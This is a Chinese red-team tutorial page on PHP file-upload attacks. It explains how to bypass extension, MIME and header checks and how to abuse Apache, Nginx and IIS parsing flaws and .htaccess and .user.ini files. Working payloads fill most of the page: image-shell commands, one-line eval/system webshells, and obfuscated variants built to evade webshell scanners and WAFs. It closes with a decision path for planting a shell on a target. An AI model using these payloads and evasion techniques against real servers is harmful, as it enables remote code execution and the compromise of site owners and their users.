## 目录

- [[#一、上传流程与 $_FILES|一、上传流程与 $_FILES]]
- [[#二、前端与后端检测|二、前端与后端检测]]
- [[#三、扩展名绕过|三、扩展名绕过]]
- [[#四、内容与MIME绕过|四、内容与MIME绕过]]
- [[#五、解析漏洞|五、解析漏洞]]
- [[#六、配置文件绕过 htaccess与user.ini|六、配置文件绕过 .htaccess 与 .user.ini]]
- [[#七、WebShell 编写|七、WebShell 编写]]
- [[#八、WebShell 免杀思路|八、WebShell 免杀思路]]
- [[#九、红队视角总结|九、红队视角总结]]

---

## 一、上传流程与 $_FILES

### 服务端接收

```php
<?php
// upload.php 典型代码
if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $name = $_FILES['file']['name'];      // 原始文件名
    $tmp  = $_FILES['file']['tmp_name'];  // 服务端临时文件 /tmp/phpXXXXXX
    $type = $_FILES['file']['type'];      // MIME 类型（客户端可伪造）
    $size = $_FILES['file']['size'];
    move_uploaded_file($tmp, "uploads/" . $name);  // 移动保存
}
?>
```

### $_FILES 结构

```text
$_FILES['file'] = [
  'name'     => 'shell.php',
  'type'     => 'application/x-php',
  'tmp_name' => '/tmp/phpYfdX5V',
  'error'    => 0,
  'size'     => 123
]
```

### 绕过思路总览

| 检测层 | 绕过 |
|--------|------|
| 前端 JS 校验 | Burp 改包直接发 |
| Content-Type | 改 MIME |
| 扩展名 | 双扩展/大小写/解析漏洞/`.htaccess` |
| 文件头 | 图片马 |
| 内容过滤 | 注释、编码、变形 |
| 黑名单 | 找漏网扩展 |
| 路径限制 | 目录穿越覆盖 |

---

## 二、前端与后端检测

### 前端 JS 校验（最弱）

```html
<!-- 前端限制 .jpg/.png -->
<input type="file" accept="image/*" onchange="check(this)">
<script>
function check(f){ if(!f.value.endsWith('.jpg')) alert('no'); }
</script>
```

绕过：Burp 拦截后直接改文件名/Content-Type 重发；或禁用 JS。

### 后端黑名单

```php
<?php
$black = ['php','php3','php4','php5','phtml','pht'];
$ext = pathinfo($name, PATHINFO_EXTENSION);
if (in_array(strtolower($ext), $black)) die("no");
?>
```

| 扩展 | 可执行（Apache+php handler） |
|------|:---:|
| `.php` | 是 |
| `.php3 .php4 .php5 .php7` | 老版本配 AddType 时是 |
| `.phtml .pht .phar` | 常见可解析 |
| `.htaccess` | 特殊（覆盖配置） |

### 后端白名单（更严）

```php
<?php
$white = ['jpg','png','gif'];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, $white)) die("no");
?>
```

白名单 → 走解析漏洞 / `.user.ini` / 图片马。

---

## 三、扩展名绕过

### 大小写

```text
shell.php   → 黑名单拦
shell.Php   → Windows/Apache 大小写不敏感可执行（Linux 上 PHP 解释器按扩展映射，Apache 对 .PhP 可能仍解析）
```

### 双扩展

```text
shell.php.jpg   → 黑名单取最后扩展名 jpg 放行
```

| 环境 | shell.php.jpg 是否执行 |
|------|:---:|
| Apache + 老版本 AddType | 可能（按最后一个已知类型解析前序） |
| Nginx 配置 `fastcgi_split_path_info` | 特定配置下解析 `.php` 段 |
| Apache 2.4.0-2.4.29 | 多后缀解析漏洞（CVE-2017-15715 用换行） |

```text
# CVE-2017-15715：换行绕过
shell.php%0a   → 黑名单不匹配 .php\n → Apache 仍解析
```

### 空格与点（Windows）

```text
shell.php.      → Windows 去尾点 → shell.php
shell.php       → 尾随空格（Windows 去尾空格）
```

### 双写

```text
shell.pphphp   → 黑名单 str_replace("php","",$name) 单次替换 → shell.php
```

### 其他可执行扩展

```text
.phtml .pht .php3 .php4 .php5 .php7 .phar .inc（配 AddType 时）
```

---

## 四、内容与MIME绕过

### MIME 伪造

```text
原始:  Content-Type: application/x-php
改包:  Content-Type: image/png
```

```bash
# 用 curl 模拟
curl -F "file=@shell.php;type=image/png" http://target/upload.php
```

### 文件头伪造（图片马）

```bash
# 制作图片马：GIF89a 头 + PHP 代码
printf 'GIF89a<?php system($_GET["c"]);?>' > shell.gif
# 或直接拼接
cp a.gif shell.gif && echo '<?php system($_GET["c"]);?>' >> shell.gif
```

| 校验 | 绕过 |
|------|------|
| `getimagesize()` | 真图片头 + 尾部追加代码（用 copy 合并） |
| 读取文件头字节 | 伪造魔数即可 |
| 二次渲染 | 需要像素内注入（GIF 注释块 / PNG IDAT 注入） |

```bash
# copy 合并（保留完整图片结构）
copy /b 1.gif + shell.txt shell.gif   # Windows
cat 1.gif shell.txt > shell.gif        # Linux
```

### 二次渲染对抗

```bash
# 工具：利用图片二次渲染后的像素点注入代码
# gif 渲染后注释块可能保留 → 利用注释注入
# 或用 png 的 tEXt 块、jpeg 的 EXIF 注释注入
```

---

## 五、解析漏洞

### Apache

| 场景 | 原理 |
|------|------|
| 多后缀 | `shell.php.jpg` 按从右向左找可识别类型，找到 `.php` 则按 php 解析 |
| `.htaccess` | 可覆盖 AddType 指定任意扩展 |
| CVE-2017-15715 | 换行符 `%0a` 绕过扩展名黑名单且被解析 |

```text
# 老 Apache 常见配置
AddType application/x-httpd-php .php .phtml
→ shell.php.jpg 解析为 php
```

### Nginx

| 场景 | 原理 |
|------|------|
| `cgi.fix_pathinfo` 特性 | `shell.jpg/x.php` 或 `shell.jpg%00.php` 将前段按 php 解析 |
| 错误配置 | `location ~ \.php$` 前缀匹配，`/uploads/shell.jpg/x.php` 命中 |

```text
# 经典 Nginx 解析漏洞
http://target/uploads/shell.jpg/x.php   → 以 PHP 解析 shell.jpg
```

### IIS（历史）

| 场景 | 原理 |
|------|------|
| `shell.asp;.jpg` | 分号截断 |
| `shell.asp%00.jpg` | 空字节截断 |
| `shell.jpg/asp` | 目录名解析 |

---

## 六、配置文件绕过 .htaccess 与 .user.ini

### .htaccess（Apache）

```text
# 上传 .htaccess 让 jpg 按 php 解析
AddType application/x-httpd-php .jpg
```

```text
# 或指定单文件
<Files "shell.jpg">
  SetHandler application/x-httpd-php
</Files>
```

```text
# 黑名单不拦 .htaccess 时（很多站点拦）
```

### .user.ini（Nginx/Apache 2.4+ 均适用）

`.user.ini` 是 PHP 的 per-directory 配置，**黑名单几乎不拦**：

```text
# .user.ini
auto_prepend_file=shell.jpg
```

| 文件 | 行为 |
|------|------|
| `auto_prepend_file` | 每个 PHP 请求执行前先包含该文件 |
| `auto_append_file` | 每个 PHP 请求执行后包含该文件 |

```text
流程:
1. 上传 .user.ini 内容: auto_prepend_file=shell.jpg
2. 上传 shell.jpg（内容: <?php system($_GET['c']);?>）
3. 访问同目录任意 .php → 自动先执行 shell.jpg → RCE
```

> `.user.ini` 是当前 WebShell 上马的常用姿势，比 .htaccess 适用范围更广。

---

## 七、WebShell 编写

### 一句话木马

```php
<?php eval($_POST['x']); ?>
<?php system($_REQUEST['c']); ?>
<?php @eval($_POST['x']); ?>
```

```text
菜刀/蚁剑/冰蝎连接:
地址: http://target/uploads/shell.php
密码: x
```

### 常用免杀变体

```php
<?php
// 编码混淆
eval($_POST['x']);

// 变形一：hex 字符串拼接
$f = "\x65\x76\x61\x6c"; $f($_POST['x']);

// 变形二：数组+变量函数
$a = $_POST['f']; $b = $_POST['c']; $a($b);

// 变形三：回调
call_user_func($_POST['f'], $_POST['c']);

// 变形四：断言（老版本）
assert($_POST['x']);

// 变形五：include 远程/本地
include($_POST['f']);
?>
```

### 加密马（冰蝎/蚁剑流量特征对抗）

| 工具 | 特征 |
|------|------|
| 冰蝎 Behinder | 预共享密钥 AES 加密，流量无明显关键字 |
| 蚁剑 AntSword | 内置编码器，默认 `assert/eval` + base64 |
| Godzilla 哥斯拉 | AES 加密，JSP/PHP 全支持 |

```text
冰蝎 php 马（精简）:
<?php @session_start(); @set_time_limit(0); @error_reporting(0);
function encode($D,$K){...} function decode($D,$K){...} ...?>
```

> 加密马的核心：关键字（eval/system）不以明文出现，流量层 WAF 难检测。但文件落地仍是 eval 家族，静态查杀可用行为检测识别。

---

## 八、WebShell 免杀思路

### 免杀维度

| 维度 | 手段 |
|------|------|
| 关键字 | 字符串拼接、编码、注释混淆 |
| 函数名 | 变量函数、`call_user_func`、反射 `ReflectionFunction` |
| 特征码 | 动态 eval 结构打散 |
| 内容 | 藏在图片/注释/长随机变量中 |
| 行为 | 冰蝎式加密流量，落地无特征 |
| 混淆 | PHP 混淆器（phpjiami 等） |

### 典型免杀结构

```php
<?php
// 动态拼接 + 编码 + 长变量名
$_0x1a = "c" . "alc";                     // "calc"
$_0x2b = "sys" . "tem";                   // "system"
$__x = base64_decode("c3lzdGVt");          // "system"
$__x($_POST['a']);
?>
```

```php
<?php
// 利用注释和换行打散正则特征
$f = 'e'./*x*/'v'.'a'./*y*/'l';
$f($_POST['x']);
?>
```

> 免杀是持续对抗：静态查杀（D 盾/河马）+ 流量查杀（WAF 语义分析）+ 行为查杀（沙箱）。做 WebShell 前先看目标防护类型。

---

## 九、红队视角总结

| 环节 | 要点 |
|------|------|
| 检测识别 | 前端 JS（弱）、后端黑白名单、内容/头校验 |
| 扩展绕过 | 大小写、双扩展、双写、空格点截断、换行 |
| 内容绕过 | MIME 伪造、图片马、二次渲染 |
| 解析漏洞 | Apache 多后缀、Nginx fix_pathinfo、IIS 截断 |
| 配置文件 | `.htaccess` AddType、`.user.ini` auto_prepend_file |
| WebShell | 一句话 → 变体 → 加密马（冰蝎/蚁剑/哥斯拉） |
| 免杀 | 拼接/编码/变量函数/反射/混淆器 |

**上马路径决策**：
1. 能传 `.php` → 直接一句话
2. 只能传图片 → 图片马 + 解析漏洞 / `.user.ini` 包含
3. 内容被查 → 免杀变体或加密马
4. 无上传 → 回 [[05-文件包含LFI_RFI|LFI 章节]] 走日志/Session/filter 链

---

**返回** [[PHP基础总目录|PHP 总目录]] | [[../前端基础总目录|前端基础总目录]]